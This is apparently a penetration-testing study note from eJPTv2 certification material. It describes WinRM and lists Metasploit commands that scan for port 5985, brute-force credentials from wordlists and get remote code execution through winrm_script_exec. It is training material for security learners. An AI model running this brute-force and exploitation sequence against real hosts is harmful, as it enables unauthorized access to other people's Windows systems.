---
up: "[[4. ARCHIVES/eJPTv2/Host & Network Penetration Testing/The Metasploit Framework/Windows Exploitation/Windows Exploitation]]"
---

# Exploiting WinRM

- Windows Remote Management protocol
- Used to facilitate remote access with Windows systems
- Typically used to:
	- remotely access and interact with Windows hosts
		- on a local network
		- on internet
	- Manage and configure windows systems remotely

- WinRM implements access control and security for communication between systems
- MSF can identify users and their passwords as well as execute commands

## Demonstration

```bash
> db_nmap -sS -sV -O -p- <ip>
# port 5985 open: WinRM
> use auxiliary/scanner/winrm/winrm_auth_methods
> run
# brute force creds
> use auxiliary/scanner/winrm/winrm_login
> set user_file common_users.txt
> set pass_file unix_passwords.txt
> run
# test creds
> use auxiliary/scanner/winrm/winrm_cmd
> set username <user>
> set password <pass>
> set CMD whoami
> run
# remote code execution
> use exploit/windows/winrm/winrm_script_exec
> set username <user>
> set password <pass>
# if problems with powershell
> set force_vbs true
> run
m> 
```
